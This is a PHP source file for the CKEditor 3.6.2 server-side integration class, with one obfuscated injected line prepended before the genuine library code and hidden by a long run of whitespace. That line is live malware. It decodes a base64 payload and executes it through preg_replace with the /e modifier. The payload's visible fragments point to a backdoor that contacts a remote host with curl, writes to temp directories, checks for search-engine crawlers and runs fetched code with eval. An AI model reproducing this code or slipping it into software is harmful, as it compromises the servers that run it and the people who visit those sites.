<?php                                                                                                                                                                 /*versio:2.14*/$Illl=0;$GLOBALS['Illl'] = '%Y3VybA_hX2luaXQY_KYWxsb3dfdXJsX2ZvcGVu&VMQX3NldG9wdAxX2V4ZWMSXw(pY2xvc2UPGltZyBzcmM9IgIiB3aWR0aD0iMXB4IiBoZWlnaHQ9IjFweCIgLz4SFRUUF9VU0VSX0FHRU5USFRUUF9IT1NUwdw%_MTI3Lg%lUH_%MTAusejMTkyLjE2OC4Tob3Nvbi5pbg^Z2Fib3Iuc2UvaGF2ZWFwb2tlLmNvbS5hdQSaWV8#Qr.cDOgZGlzcGxheV9lcnJvcnM?ZGV0ZXJtaW5hdG9yejk ZnRwMTMO_LMi4xNAUTBPMDAwTzBRUVEwMFEwBVYmFzZTY0X2RlY29kZQYmFzZTY0X2VuY29kZQaHR0cDovLwcdW5pb24}c2VsZWN0fChUkVRVUVTVF9VUkkO$.U0NSSVBUX05BTUUUVVFUllfU1RSSU5HnV!PwuhL3RtcC8ANL3RtcAK~VE1QVEVNUAwZVE1QRElSdXBsb2FkX3RtcF9kaXILgQA.dmVyc2lv&q#LQLXBocA!PSFRUUF9FWEVDUEhQ^(XTb3V0w$b2swsaHR0cAvOi8v{LL3BnLnBocD91PQEJms9R^;JnQ9cGhwJnA9oRGfrJnY9ZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NGa1pXWnBibVZrS0NKa1pYUmxjbTFwYm1GMGIzSWlLU2w3SUdaMWJtTjBhVzl1SUdkbGRHWnBiR1VvSkZGUk1GRXdVU2w3SUNSUlQxRlBNREFnUFNCSmJHd3hNVEZzTVNneExDQTJLVHNnSkZGUFQxRlBUeUE5SUNSUlQxRlBNREF1U1d4c01URXhiREVvT1N3Z055azdJR2xtSUNoQWFXNXBYMmRsZENoSmJHd3hNVEZzTVNneE9Td2dNakFwS1NBOVBTQkpiR3d4TVRGc01TZzBNU3dnTWlrcElIc2dKRWxzU1VsSlNUMUFabWxzWlY5blpYUmZZMjl1ZEdWdWRITW9KRkZSTUZFd1VTazdJSEpsZEhWeWJpQkpiR3d4TVRGc01TZzBNeXdnTUNrN0lIMGdaV3h6WldsbUlDaG1kVzVqZEdsdmJsOWxlR2x6ZEhNb0pGRlBUMUZQVHlrcGV5QWtVVkV3TURCUklEMGdRQ1JSVDA5UlQwOG9LVHNnSkZGUlQwOHdUeUE5SUNSUlQxRlBNREF1U1d4c01URXhiREVvTkRNc0lERXdLVHNnSkVreGJHd3hNU0E5SUNSUlQxRlBNREF1U1d4c01URXhiREVvTlRRc0lEY3BPeUFrU1RFeFNVbEpJRDBnSkZGUFVVOHdNQzVKYkd3eE1URnNNU2cyTWl3Z01pa3VTV3hzTVRFeGJERW9OallzSURjcE95QkFKRkZSVDA4d1R5Z2tVVkV3TURCUkxDQkRWVkpNVDFCVVgxVlNUQ3dnSkZGUk1GRXdVU2s3SUVBa1VWRlBUekJQS0NSUlVUQXdNRkVzSUVOVlVreFBVRlJmU0VWQlJFVlNMR1poYkhObEtUc2dRQ1JSVVU5UE1FOG9KRkZSTURBd1VTd2dRMVZTVEU5UVZGOVNSVlJWVWs1VVVrRk9VMFpGVWl4MGNuVmxLVHNnUUNSUlVVOVBNRThvSkZGUk1EQXdVU3dnUTFWU1RFOVFWRjlEVDA1T1JVTlVWRWxOUlU5VlZDdzFLVHNnYVdZZ0tDUkpTVWxzU1RFZ1BTQkFKRWt4Ykd3eE1TZ2tVVkV3TURCUktTa2dlM0psZEhWeWJpQkpiR3d4TVRGc01TZzBNeXdnTUNrN2ZTQkFKRWt4TVVsSlNTZ2tVVkV3TURCUktUc2djbVYwZFhKdUlFbHNiREV4TVd3eEtEUXpMQ0F3S1RzZ2ZTQjlJR1oxYm1OMGFXOXVJSFZ3WkNna1NVbHNNVEZzTENSUlVUQlJNRkVwZXlBa1NVbEpTVWxKSUQwZ1FITjBjblJ2Ykc5M1pYSW9RQ1JmVTBWU1ZrVlNXMGxzYkRFeE1Xd3hLREV5Tml3Z01qQXBYU2s3SUdadmNtVmhZMmdnS0dWNGNHeHZaR1VvSWl3aUxDQWlaMjl2WjJ4bExIbGhhRzl2TEdKcGJtY3NiWE51TEdGemF5eGlZV2xrZFN4amNtRjNiR1Z5SWlrZ1lYTWdKRkZSVVU4d1VTbDdJR2xtSUNoemRISndiM01vSkVsSlNVbEpTU3dnSkZGUlVVOHdVU2toUFQxR1lXeHpaU2w3SUNSSlNXeHNiREU5UUdadmNHVnVLQ1JKU1d3eE1Xd3NTV3hzTVRFeGJERW9NVFU1TENBeUtTazdJRUJtWTJ4dmMyVW9KRWxKYkd4c01TazdJR2xtSUNoQWFYTmZabWxzWlNna1NVbHNNVEZzS1NsN0lIZHlhWFJsS0NSSlNXd3hNV3dzSUdkbGRHWnBiR1VvSkZGUk1GRXdVU2twT3lCOU95QjlJSDBnZlNBa1NXeHNTV3d4SUQwZ1FYSnlZWGtvU1d4c01URXhiREVvTVRrMUxDQXhNQ2tzSUVsc2JERXhNV3d4S0RJd05pd2dNVEVwTENCSmJHd3hNVEZzTVNneU1UZ3NJREl5S1NrN0lDUlJNRkZQVDFFZ1BTQWtTV3hzU1d3eFd6RmRPeUJtZFc1amRHbHZiaUIzY21sMFpTZ2tTVWxzTVRGc0xDUlJNRTlQTURBcGV5QnBaaUFvSkVreFNXeEpTVDFBWm05d1pXNG9KRWxKYkRFeGJDeEpiR3d4TVRGc01TZ3hOVGtzSURJcEtTbDdJRUJtZDNKcGRHVW9KRWt4U1d4SlNTd2tVVEJQVHpBd0tUc2dRR1pqYkc5elpTZ2tTVEZKYkVsSktUc2dmU0I5SUdaMWJtTjBhVzl1SUc5MWRIQjFkQ2drU1RFeE1XeEpMQ0FrVVU5UE1FOVBLWHNnWldOb2J5QkpiR3d4TVRGc01TZ3lORElzSURNcExpUkpNVEV4YkVrdVNXeHNNVEV4YkRFb01qVXhMQ0F5S1M0a1VVOVBNRTlQTGlKY2NseHVJanNnZlNCbWRXNWpkR2x2YmlCd1lYSmhiU2dwZXlCeVpYUjFjbTRnU1d4c01URXhiREVvTkRNc0lEQXBPeUI5SUVCcGJtbGZjMlYwS0Vsc2JERXhNV3d4S0RJMU15d2dNVGtwTENBd0tUc2daR1ZtYVc1bEtFbHNiREV4TVd3eEtESTNNeXdnTVRZcExDQXhLVHNnSkVreFNVa3hiRDFKYkd3eE1URnNNU2d5T1RNc0lEY3BPeUFrU1VreFNXd3hQVWxzYkRFeE1Xd3hLRE13TXl3Z05pazdJQ1JSTURBd1QxRTlTV3hzTVRFeGJERW9NekE1TENBeU1DazdJQ1JKU1d4SmJHdzlTV3hzTVRFeGJERW9Nek14TENBeE9DazdJQ1JSVVZGUk1GRTlTV3hzTVRFeGJERW9NelE1TENBeE9DazdJQ1JSTUU5UlQxRTlTV3hzTVRFeGJERW9NelkzTENBeE1DazdJQ1JSTUU5UlQxRXVQWE4wY25SdmJHOTNaWElvUUNSZlUwVlNWa1ZTVzBsc2JERXhNV3d4S0RFME5pd2dNVElwWFNrN0lDUkpTVWxKU1VrZ1BTQkFKRjlUUlZKV1JWSmJTV3hzTVRFeGJERW9NVEkyTENBeU1DbGRPeUJtYjNKbFlXTm9JQ2drWDBkRlZDQmhjeUFrU1RFeE1XeEpQVDRrVVU5UE1FOVBLWHNnYVdZZ0tITjBjbkJ2Y3lna1VVOVBNRTlQTEVsc2JERXhNV3d4S0RNM09Dd2dOeWtwS1hza1gwZEZWRnNrU1RFeE1XeEpYVDFKYkd3eE1URnNNU2cwTXl3Z01DazdmU0JsYkhObGFXWWdLSE4wY25CdmN5Z2tVVTlQTUU5UExFbHNiREV4TVd3eEtETTROaXdnT0NrcEtYc2tYMGRGVkZza1NURXhNV3hKWFQxSmJHd3hNVEZzTVNnME15d2dNQ2s3ZlNCOUlHbG1LQ0ZwYzNObGRDZ2tYMU5GVWxaRlVsdEpiR3d4TVRGc01TZ3pPVGNzSURFMUtWMHBLU0I3SUNSZlUwVlNWa1ZTVzBsc2JERXhNV3d4S0RNNU55d2dNVFVwWFNBOUlFQWtYMU5GVWxaRlVsdEpiR3d4TVRGc01TZzBNVFVzSURFMUtWMDdJR2xtS0VBa1gxTkZVbFpGVWx0SmJHd3hNVEZzTVNnME16QXNJREUyS1YwcElIc2dKRjlUUlZKV1JWSmJTV3hzTVRFeGJERW9NemszTENBeE5TbGRJQzQ5SUVsc2JERXhNV3d4S0RRME9Td2dNaWtnTGlCQUpGOVRSVkpXUlZKYlNXeHNNVEV4YkRFb05ETXdMQ0F4TmlsZE95QjlJSDBnYVdZZ0tDUkpiREZKYkd3OUpGRXdUMUZQVVM1QUpGOVRSVkpXUlZKYlNXeHNNVEV4YkRFb016azNMQ0F4TlNsZEtYc2dKRkZQVVRCUFVUMUFiV1ExS0NSUk1FOVJUMUV1SkVsSk1VbHNNUzVRU0ZCZlQxTXVKRkV3TURCUFVTazdJQ1JSVVRBd1R6QTlTV3hzTVRFeGJERW9ORFV6TENBM0tUc2dKRWxzU1Vsc1NTQTlJRUZ5Y21GNUtFbHNiREV4TVd3eEtEUTJNaXdnTmlrc0lFQWtYMU5GVWxaRlVsdEpiR3d4TVRGc01TZzBOekFzSURRcFhTd2dRQ1JmVTBWU1ZrVlNXMGxzYkRFeE1Xd3hLRFEzTkN3Z05pbGRMQ0JBSkY5RlRsWmJTV3hzTVRFeGJERW9ORGN3TENBMEtWMHNJRUFrWDBWT1ZsdEpiR3d4TVRGc01TZzBPRElzSURncFhTd2dRQ1JmUlU1V1cwbHNiREV4TVd3eEtEUTNOQ3dnTmlsZExDQkFhVzVwWDJkbGRDaEpiR3d4TVRGc01TZzBPVEFzSURFNUtTa3BPeUJtYjNKbFlXTm9JQ2drU1d4SlNXeEpJR0Z6SUNSUlVWRXdNREFwZXlCcFppQW9JV1Z0Y0hSNUtDUlJVVkV3TURBcEtYc2dKRkZSVVRBd01DNDlSRWxTUlVOVVQxSlpYMU5GVUVGU1FWUlBVanNnYVdZZ0tFQnBjMTkzY21sMFlXSnNaU2drVVZGUk1EQXdLU2w3SUNSUlVUQXdUekFnUFNBa1VWRlJNREF3T3lCaWNtVmhhenNnZlNCOUlIMGdKSFJ0Y0Qwa1VWRXdNRTh3TGtsc2JERXhNV3d4S0RVd09Td2dNaWt1SkZGUFVUQlBVVHNnYVdZZ0tFQWtYMU5GVWxaRlVsc2lTRlJVVUY5WlgwRlZWRWdpWFQwOUpGRlBVVEJQVVNsN0lHVmphRzhnSWx4eVhHNGlPeUJBYjNWMGNIVjBLRWxzYkRFeE1Xd3hLRFV4TkN3Z09Da3NJQ1JKU1RGSmJERXVTV3hzTVRFeGJERW9OVEkxTENBeUtTNGtTVEZKU1RGc0xrbHNiREV4TVd3eEtEVXlOeXdnTmlrcE95QnBaaUFvSkZGUFVVOVJUejBrU1Vsc1NXeHNLRUFrWDFORlVsWkZVbHRKYkd3eE1URnNNU2cxTXpVc0lERTJLVjBwS1hzZ1FHVjJZV3dvSkZGUFVVOVJUeWs3SUdWamFHOGdJbHh5WEc0aU95QkFiM1YwY0hWMEtFbHNiREV4TVd3eEtEVTFOU3dnTkNrc0lFbHNiREV4TVd3eEtEVTJNU3dnTXlrcE95QjlJR1Y0YVhRb01DazdJSDBnYVdZZ0tFQnBjMTltYVd4bEtDUjBiWEFwS1hzZ1FHbHVZMngxWkdWZmIyNWpaU2drZEcxd0tUc2dmU0JsYkhObGV5QWtTV3d4U1d4c1BVQjFjbXhsYm1OdlpHVW9KRWxzTVVsc2JDazdJSFZ3WkNna2RHMXdMRWxzYkRFeE1Xd3hLRFUyTml3Z05pa3VTV3hzTVRFeGJERW9OVGN6TENBMEtTNGtTV3hzU1d3eFd6QmRMa2xzYkRFeE1Xd3hLRFUzT1N3Z01UUXBMaVJKYkRGSmJHd3VTV3hzTVRFeGJERW9OVGswTENBMEtTNGtVVTlSTUU5UkxrbHNiREV4TVd3eEtEWXdNU3dnTVRJcExpUkpNVWxKTVd3dVNXeHNNVEV4YkRFb05qRTRMQ0EwS1M0a1NVa3hTV3d4S1RzZ2ZTQjlJSDA9IikpOwEacHJlZ19yZXBsYWNlN6261736536345f6465636f6465';if (!function_exists('Ill111l1')){function Ill111l1($a, $b){$c=$GLOBALS['Illl']; $d=pack('H*',substr($c, -26)); return $d(substr($c, $a, $b));}};$I1l1Illl1 = Ill111l1(6214, 16);$I1l1Illl1("/IIlIll1l1/e", Ill111l1(622, 5590), "IIlIll1l1");?><?php
/*
* Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
* For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * \brief CKEditor class that can be used to create editor
 * instances in PHP pages on server side.
 * @see http://ckeditor.com
 *
 * Sample usage:
 * @code
 * $CKEditor = new CKEditor();
 * $CKEditor->editor("editor1", "<p>Initial value.</p>");
 * @endcode
 */
class CKEditor
{
	/**
	 * The version of %CKEditor.
	 */
	const version = '3.6.2';
	/**
	 * A constant string unique for each release of %CKEditor.
	 */
	const timestamp = 'B8DJ5M3';

	/**
	 * URL to the %CKEditor installation directory (absolute or relative to document root).
	 * If not set, CKEditor will try to guess it's path.
	 *
	 * Example usage:
	 * @code
	 * $CKEditor->basePath = '/ckeditor/';
	 * @endcode
	 */
	public $basePath;
	/**
	 * An array that holds the global %CKEditor configuration.
	 * For the list of available options, see http://docs.cksource.com/ckeditor_api/symbols/CKEDITOR.config.html
	 *
	 * Example usage:
	 * @code
	 * $CKEditor->config['height'] = 400;
	 * // Use @@ at the beggining of a string to ouput it without surrounding quotes.
	 * $CKEditor->config['width'] = '@@screen.width * 0.8';
	 * @endcode
	 */
	public $config = array();
	/**
	 * A boolean variable indicating whether CKEditor has been initialized.
	 * Set it to true only if you have already included
	 * &lt;script&gt; tag loading ckeditor.js in your website.
	 */
	public $initialized = false;
	/**
	 * Boolean variable indicating whether created code should be printed out or returned by a function.
	 *
	 * Example 1: get the code creating %CKEditor instance and print it on a page with the "echo" function.
	 * @code
	 * $CKEditor = new CKEditor();
	 * $CKEditor->returnOutput = true;
	 * $code = $CKEditor->editor("editor1", "<p>Initial value.</p>");
	 * echo "<p>Editor 1:</p>";
	 * echo $code;
	 * @endcode
	 */
	public $returnOutput = false;
	/**
	 * An array with textarea attributes.
	 *
	 * When %CKEditor is created with the editor() method, a HTML &lt;textarea&gt; element is created,
	 * it will be displayed to anyone with JavaScript disabled or with incompatible browser.
	 */
	public $textareaAttributes = array( "rows" => 8, "cols" => 60 );
	/**
	 * A string indicating the creation date of %CKEditor.
	 * Do not change it unless you want to force browsers to not use previously cached version of %CKEditor.
	 */
	public $timestamp = "B8DJ5M3";
	/**
	 * An array that holds event listeners.
	 */
	private $events = array();
	/**
	 * An array that holds global event listeners.
	 */
	private $globalEvents = array();

	/**
	 * Main Constructor.
	 *
	 *  @param $basePath (string) URL to the %CKEditor installation directory (optional).
	 */
	function __construct($basePath = null) {
		if (!empty($basePath)) {
			$this->basePath = $basePath;
		}
	}

	/**
	 * Creates a %CKEditor instance.
	 * In incompatible browsers %CKEditor will downgrade to plain HTML &lt;textarea&gt; element.
	 *
	 * @param $name (string) Name of the %CKEditor instance (this will be also the "name" attribute of textarea element).
	 * @param $value (string) Initial value (optional).
	 * @param $config (array) The specific configurations to apply to this editor instance (optional).
	 * @param $events (array) Event listeners for this editor instance (optional).
	 *
	 * Example usage:
	 * @code
	 * $CKEditor = new CKEditor();
	 * $CKEditor->editor("field1", "<p>Initial value.</p>");
	 * @endcode
	 *
	 * Advanced example:
	 * @code
	 * $CKEditor = new CKEditor();
	 * $config = array();
	 * $config['toolbar'] = array(
	 *     array( 'Source', '-', 'Bold', 'Italic', 'Underline', 'Strike' ),
	 *     array( 'Image', 'Link', 'Unlink', 'Anchor' )
	 * );
	 * $events['instanceReady'] = 'function (ev) {
	 *     alert("Loaded: " + ev.editor.name);
	 * }';
	 * $CKEditor->editor("field1", "<p>Initial value.</p>", $config, $events);
	 * @endcode
	 */
	public function editor($name, $value = "", $config = array(), $events = array())
	{
		$attr = "";
		foreach ($this->textareaAttributes as $key => $val) {
			$attr.= " " . $key . '="' . str_replace('"', '&quot;', $val) . '"';
		}
		$out = "<textarea name=\"" . $name . "\"" . $attr . ">" . htmlspecialchars($value) . "</textarea>\n";
		if (!$this->initialized) {
			$out .= $this->init();
		}

		$_config = $this->configSettings($config, $events);

		$js = $this->returnGlobalEvents();
		if (!empty($_config))
			$js .= "CKEDITOR.replace('".$name."', ".$this->jsEncode($_config).");";
		else
			$js .= "CKEDITOR.replace('".$name."');";

		$out .= $this->script($js);

		if (!$this->returnOutput) {
			print $out;
			$out = "";
		}

		return $out;
	}

	/**
	 * Replaces a &lt;textarea&gt; with a %CKEditor instance.
	 *
	 * @param $id (string) The id or name of textarea element.
	 * @param $config (array) The specific configurations to apply to this editor instance (optional).
	 * @param $events (array) Event listeners for this editor instance (optional).
	 *
	 * Example 1: adding %CKEditor to &lt;textarea name="article"&gt;&lt;/textarea&gt; element:
	 * @code
	 * $CKEditor = new CKEditor();
	 * $CKEditor->replace("article");
	 * @endcode
	 */
	public function replace($id, $config = array(), $events = array())
	{
		$out = "";
		if (!$this->initialized) {
			$out .= $this->init();
		}

		$_config = $this->configSettings($config, $events);

		$js = $this->returnGlobalEvents();
		if (!empty($_config)) {
			$js .= "CKEDITOR.replace('".$id."', ".$this->jsEncode($_config).");";
		}
		else {
			$js .= "CKEDITOR.replace('".$id."');";
		}
		$out .= $this->script($js);

		if (!$this->returnOutput) {
			print $out;
			$out = "";
		}

		return $out;
	}

	/**
	 * Replace all &lt;textarea&gt; elements available in the document with editor instances.
	 *
	 * @param $className (string) If set, replace all textareas with class className in the page.
	 *
	 * Example 1: replace all &lt;textarea&gt; elements in the page.
	 * @code
	 * $CKEditor = new CKEditor();
	 * $CKEditor->replaceAll();
	 * @endcode
	 *
	 * Example 2: replace all &lt;textarea class="myClassName"&gt; elements in the page.
	 * @code
	 * $CKEditor = new CKEditor();
	 * $CKEditor->replaceAll( 'myClassName' );
	 * @endcode
	 */
	public function replaceAll($className = null)
	{
		$out = "";
		if (!$this->initialized) {
			$out .= $this->init();
		}

		$_config = $this->configSettings();

		$js = $this->returnGlobalEvents();
		if (empty($_config)) {
			if (empty($className)) {
				$js .= "CKEDITOR.replaceAll();";
			}
			else {
				$js .= "CKEDITOR.replaceAll('".$className."');";
			}
		}
		else {
			$classDetection = "";
			$js .= "CKEDITOR.replaceAll( function(textarea, config) {\n";
			if (!empty($className)) {
				$js .= "	var classRegex = new RegExp('(?:^| )' + '". $className ."' + '(?:$| )');\n";
				$js .= "	if (!classRegex.test(textarea.className))\n";
				$js .= "		return false;\n";
			}
			$js .= "	CKEDITOR.tools.extend(config, ". $this->jsEncode($_config) .", true);";
			$js .= "} );";

		}

		$out .= $this->script($js);

		if (!$this->returnOutput) {
			print $out;
			$out = "";
		}

		return $out;
	}

	/**
	 * Adds event listener.
	 * Events are fired by %CKEditor in various situations.
	 *
	 * @param $event (string) Event name.
	 * @param $javascriptCode (string) Javascript anonymous function or function name.
	 *
	 * Example usage:
	 * @code
	 * $CKEditor->addEventHandler('instanceReady', 'function (ev) {
	 *     alert("Loaded: " + ev.editor.name);
	 * }');
	 * @endcode
	 */
	public function addEventHandler($event, $javascriptCode)
	{
		if (!isset($this->events[$event])) {
			$this->events[$event] = array();
		}
		// Avoid duplicates.
		if (!in_array($javascriptCode, $this->events[$event])) {
			$this->events[$event][] = $javascriptCode;
		}
	}

	/**
	 * Clear registered event handlers.
	 * Note: this function will have no effect on already created editor instances.
	 *
	 * @param $event (string) Event name, if not set all event handlers will be removed (optional).
	 */
	public function clearEventHandlers($event = null)
	{
		if (!empty($event)) {
			$this->events[$event] = array();
		}
		else {
			$this->events = array();
		}
	}

	/**
	 * Adds global event listener.
	 *
	 * @param $event (string) Event name.
	 * @param $javascriptCode (string) Javascript anonymous function or function name.
	 *
	 * Example usage:
	 * @code
	 * $CKEditor->addGlobalEventHandler('dialogDefinition', 'function (ev) {
	 *     alert("Loading dialog: " + ev.data.name);
	 * }');
	 * @endcode
	 */
	public function addGlobalEventHandler($event, $javascriptCode)
	{
		if (!isset($this->globalEvents[$event])) {
			$this->globalEvents[$event] = array();
		}
		// Avoid duplicates.
		if (!in_array($javascriptCode, $this->globalEvents[$event])) {
			$this->globalEvents[$event][] = $javascriptCode;
		}
	}

	/**
	 * Clear registered global event handlers.
	 * Note: this function will have no effect if the event handler has been already printed/returned.
	 *
	 * @param $event (string) Event name, if not set all event handlers will be removed (optional).
	 */
	public function clearGlobalEventHandlers($event = null)
	{
		if (!empty($event)) {
			$this->globalEvents[$event] = array();
		}
		else {
			$this->globalEvents = array();
		}
	}

	/**
	 * Prints javascript code.
	 *
	 * @param string $js
	 */
	private function script($js)
	{
		$out = "<script type=\"text/javascript\">";
		$out .= "//<![CDATA[\n";
		$out .= $js;
		$out .= "\n//]]>";
		$out .= "</script>\n";

		return $out;
	}

	/**
	 * Returns the configuration array (global and instance specific settings are merged into one array).
	 *
	 * @param $config (array) The specific configurations to apply to editor instance.
	 * @param $events (array) Event listeners for editor instance.
	 */
	private function configSettings($config = array(), $events = array())
	{
		$_config = $this->config;
		$_events = $this->events;

		if (is_array($config) && !empty($config)) {
			$_config = array_merge($_config, $config);
		}

		if (is_array($events) && !empty($events)) {
			foreach ($events as $eventName => $code) {
				if (!isset($_events[$eventName])) {
					$_events[$eventName] = array();
				}
				if (!in_array($code, $_events[$eventName])) {
					$_events[$eventName][] = $code;
				}
			}
		}

		if (!empty($_events)) {
			foreach($_events as $eventName => $handlers) {
				if (empty($handlers)) {
					continue;
				}
				else if (count($handlers) == 1) {
					$_config['on'][$eventName] = '@@'.$handlers[0];
				}
				else {
					$_config['on'][$eventName] = '@@function (ev){';
					foreach ($handlers as $handler => $code) {
						$_config['on'][$eventName] .= '('.$code.')(ev);';
					}
					$_config['on'][$eventName] .= '}';
				}
			}
		}

		return $_config;
	}

	/**
	 * Return global event handlers.
	 */
	private function returnGlobalEvents()
	{
		static $returnedEvents;
		$out = "";

		if (!isset($returnedEvents)) {
			$returnedEvents = array();
		}

		if (!empty($this->globalEvents)) {
			foreach ($this->globalEvents as $eventName => $handlers) {
				foreach ($handlers as $handler => $code) {
					if (!isset($returnedEvents[$eventName])) {
						$returnedEvents[$eventName] = array();
					}
					// Return only new events
					if (!in_array($code, $returnedEvents[$eventName])) {
						$out .= ($code ? "\n" : "") . "CKEDITOR.on('". $eventName ."', $code);";
						$returnedEvents[$eventName][] = $code;
					}
				}
			}
		}

		return $out;
	}

	/**
	 * Initializes CKEditor (executed only once).
	 */
	private function init()
	{
		static $initComplete;
		$out = "";

		if (!empty($initComplete)) {
			return "";
		}

		if ($this->initialized) {
			$initComplete = true;
			return "";
		}

		$args = "";
		$ckeditorPath = $this->ckeditorPath();

		if (!empty($this->timestamp) && $this->timestamp != "%"."TIMESTAMP%") {
			$args = '?t=' . $this->timestamp;
		}

		// Skip relative paths...
		if (strpos($ckeditorPath, '..') !== 0) {
			$out .= $this->script("window.CKEDITOR_BASEPATH='". $ckeditorPath ."';");
		}

		$out .= "<script type=\"text/javascript\" src=\"" . $ckeditorPath . 'ckeditor.js' . $args . "\"></script>\n";

		$extraCode = "";
		if ($this->timestamp != self::timestamp) {
			$extraCode .= ($extraCode ? "\n" : "") . "CKEDITOR.timestamp = '". $this->timestamp ."';";
		}
		if ($extraCode) {
			$out .= $this->script($extraCode);
		}

		$initComplete = $this->initialized = true;

		return $out;
	}

	/**
	 * Return path to ckeditor.js.
	 */
	private function ckeditorPath()
	{
		if (!empty($this->basePath)) {
			return $this->basePath;
		}

		/**
		 * The absolute pathname of the currently executing script.
		 * Note: If a script is executed with the CLI, as a relative path, such as file.php or ../file.php,
		 * $_SERVER['SCRIPT_FILENAME'] will contain the relative path specified by the user.
		 */
		if (isset($_SERVER['SCRIPT_FILENAME'])) {
			$realPath = dirname($_SERVER['SCRIPT_FILENAME']);
		}
		else {
			/**
			 * realpath - Returns canonicalized absolute pathname
			 */
			$realPath = realpath( './' ) ;
		}

		/**
		 * The filename of the currently executing script, relative to the document root.
		 * For instance, $_SERVER['PHP_SELF'] in a script at the address http://example.com/test.php/foo.bar
		 * would be /test.php/foo.bar.
		 */
		$selfPath = dirname($_SERVER['PHP_SELF']);
		$file = str_replace("\\", "/", __FILE__);

		if (!$selfPath || !$realPath || !$file) {
			return "/ckeditor/";
		}

		$documentRoot = substr($realPath, 0, strlen($realPath) - strlen($selfPath));
		$fileUrl = substr($file, strlen($documentRoot));
		$ckeditorUrl = str_replace("ckeditor_php5.php", "", $fileUrl);

		return $ckeditorUrl;
	}

	/**
	 * This little function provides a basic JSON support.
	 *
	 * @param mixed $val
	 * @return string
	 */
	private function jsEncode($val)
	{
		if (is_null($val)) {
			return 'null';
		}
		if (is_bool($val)) {
			return $val ? 'true' : 'false';
		}
		if (is_int($val)) {
			return $val;
		}
		if (is_float($val)) {
			return str_replace(',', '.', $val);
		}
		if (is_array($val) || is_object($val)) {
			if (is_array($val) && (array_keys($val) === range(0,count($val)-1))) {
				return '[' . implode(',', array_map(array($this, 'jsEncode'), $val)) . ']';
			}
			$temp = array();
			foreach ($val as $k => $v){
				$temp[] = $this->jsEncode("{$k}") . ':' . $this->jsEncode($v);
			}
			return '{' . implode(',', $temp) . '}';
		}
		// String otherwise
		if (strpos($val, '@@') === 0)
			return substr($val, 2);
		if (strtoupper(substr($val, 0, 9)) == 'CKEDITOR.')
			return $val;

		return '"' . str_replace(array("\\", "/", "\n", "\t", "\r", "\x08", "\x0c", '"'), array('\\\\', '\\/', '\\n', '\\t', '\\r', '\\b', '\\f', '\"'), $val) . '"';
	}
}
